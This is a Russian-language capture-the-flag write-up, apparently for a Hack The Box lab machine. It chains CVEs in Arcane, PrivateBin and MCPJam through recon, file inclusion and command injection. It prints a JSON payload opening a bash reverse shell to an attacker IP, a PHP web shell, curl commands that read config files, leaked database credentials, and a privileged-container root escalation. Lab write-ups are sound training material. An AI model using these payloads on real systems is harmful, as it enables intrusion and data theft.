
Запускаем сканирование портов.

```bash
sudo nmap -Pn -n --min-rate=1000 --open 10.129.245.50 -p- -oN discovery/full-tcp
```

![[Pasted image 20260529132754.png]]

`nmap` обнаружил 4 открытых TCP-порта: 22, 80, 443 и 3552.

В сертификате, который крутится на 443 порту можно увидеть доменное имя `kobold.htb` и wildcard  на `*.kobold.htb`, что намекает на наличие дополнительных субдоменов.

![[Pasted image 20260529133213.png]]

Добавим найденные хосты в `/etc/hosts`.

```bash
echo "10.129.245.50 kobold.htb *.kobold.htb" | sudo tee -a /etc/hosts
```

И просканируем сервисы на открытых портах.

```bash
sudo nmap -sV -sC -Pn -n -p22,80,443,3552 kobold.htb -oN discovery/tcp-services
```

![[Pasted image 20260529133620.png]]

`nmap` определило целевую систему как Ubuntu по банеру SSH-службы. Мы также видим работу `nginx 1.24.0` на 80 и 443 портах и еще один HTTP сервис на базе `Golang net` на 3552 порту.

На 443 мы не видим ничего интересного - обычная страница заглушка.

![[Pasted image 20260529133817.png]]

А на 3552 порту нас встречает форма входа в Arcane.  
Arcane - это удобный веб-интерфейс управления docker-контейнерами. Внизу страницы мы видим запущенную версию `1.13.0` и [ссылку](https://github.com/getarcaneapp/arcane) на GitHub-репозиторий проекта.

![[Pasted image 20260529134012.png]]

Смотрим на последние релизы и видим исправление безопасности в примечаниях к следующей версии.  Оказалось, что установленная версия уязвима к `CVE-2026-23944`.

![[Pasted image 20260529134353.png]]

Уязвимость связана с тем, что middleware прокси-сервера обрабатывает запросы к `/api/environments/{id}/...` без аутентификации, что позволяет просматривать список контейнеров, их логи и конечные точки.

![[Pasted image 20260529134740.png]]

Но, к сожалению, перебор уязвимых конечных точек не дал результатов.

Попробуем расширить поверхность атаки и поискать дополнительные субдомены.

```bash
ffuf -u https://kobold.htb -k -H "Host: FUZZ.kobold.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 154
```

![[Pasted image 20260529144640.png]]

В результате получаем два новых субдомена 
- `ncp.kobold.htb`
- `bin.kobold.htb`

На `bin.kobold.htb` крутится `PrivateBin 2.0.2`. Это open-source сервис для обмена конфиденциальным текстом.

![[Pasted image 20260529144850.png]]

Смотрим примечания к релизам на GitHub и обнаруживаем уязвимость установленной версии к  PHP file inclusion (`CVE-2025-64714`). 

![[Pasted image 20260529145408.png]]

Уязвимость заключалается в недостаточной санитации параметра cookie `template`, что позволяет читать произвольные PHP-файлы на сервере и может привести к RCE при возможности записи  PHP кода на сервер.

 Отправляем запрос с PoC в Burp'e и получаем ошибку 500, что может сигнализировать о наличии уязвимости.

![[Pasted image 20260529150521.png]]

На `mcp.kobold.htb` крутится `MCPJam` -  инструмент разработчика, созданный для тестирования, отладки и визуализации работы MCP-серверов.

MCP (Model Context Protocol) - это открытый стандарт, через который LLM агенты образаются  к внешним системам (API/filesystem/shell)


![[Pasted image 20260529151240.png]]

Ищем уязвимости для `MCPJam` и находим `CVE-2026-23744`. Это критическая уязвимость, приводящая к Blind RCE через специально составленный HTTP-запрос.

Уязвимость возникает из-за того, что конечная точка `/api/mcp/connect` принимает поля `command` и `args` из тела запроса и передает их без проверки в функцию запуска процесса. Подробнее эта уязвимость описана [здесь](https://medium.com/@iamkumarraj/exploiting-mcpjam-inspector-understanding-rce-via-api-mcp-connect-2f2791166d2a)

Попробуем установить reverse-shell. Для этого использован данный пэйлоад

```json
{  
  "serverConfig": {  
    "command": "/bin/bash",  
    "args": ["-c", "bash -i >& /dev/tcp/10.10.14.123/9001 0>&1"],  
    "env": {}  
  },  
  "serverId": "test"  
}
```

Запускаем слушатель, отправляем нагрузку и получаем приглашение командной строки пользователя `ben`

![[Pasted image 20260529184522.png]]

Стабилизируем шелл до интерактивного с помощью `python pty`

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# ^z
stty raw -echo; fg
```

![[Pasted image 20260529184827.png]]

Пользователь `ben`, к которому мы имеем доступ, состоит в группе `operators`. Эта группа имеет права на `privatebin-data` в корне приложения.

![[Pasted image 20260529185037.png]]

Судя по содержимому - это директория сервиса `PrivateBin`, который мы обнаружили ранее. 

Попробуем получить RCE от имени сервиса через найденную `CVE-2025-64714` и запись web-shell'а в директорию с приложением.

Сохраняем shell в `/privatebin-data/data.

```php
<?php
if(isset($_REQUEST['cmd'])) {
    echo '<pre>' . shell_exec($_REQUEST['cmd']) . '</pre>';
}
?>
```

И выполняем команды с помощью `curl`

```bash
curl -s "https://bin.kobold.htb" -k -b "template=../data/shell" -G --data-urlencode "cmd=cat /etc/os-release"
```

![[Pasted image 20260529185416.png]]

Беглый анализ показал, что мы находимся внутри docker-контейнера.

![[Pasted image 20260529185545.png]]

В переменной окружение есть `CONFIG_PATH=/srv/cfg`. Судя по всему это mount к `privatebin-data` на хостовой машине.

![[Pasted image 20260529185739.png]]

Смотрим на конфиг сервиса по пути `/srv/cfg/conf.py`. В выводе замечаем логин и пароль для подключения к MySQL.

```bash
curl -s "https://bin.kobold.htb" -k -b "template=../data/shell" -G --data-urlencode "cmd=cat /srv/cfg/conf.php" | grep -v "^;" | tr -s '\n'
```

![[Pasted image 20260529191223.png]]

```
privatebin
ComplexP@sswordAdmin1928
```

Используем найденный пароль к панели Arcane в совокупности с дефолтным именем пользователя `arcane`. Учетные данные подошли и теперь мы имеем доступ к дэшборду и управлению образами.

![[Pasted image 20260529191451.png]]

Для эскалации привилегий до root пользователя запустим еще один контейнер `privatebin` в privileged режиме для монтирования корневой файловой системы.

Создаем контейнер с нужными параметрами, открываем shell и получаем полный доступ к rootfs.

![[Pasted image 20260529193309.png]]

![[Pasted image 20260529193341.png]]

![[Pasted image 20260529192709.png]]

![[Pasted image 20260529193455.png]]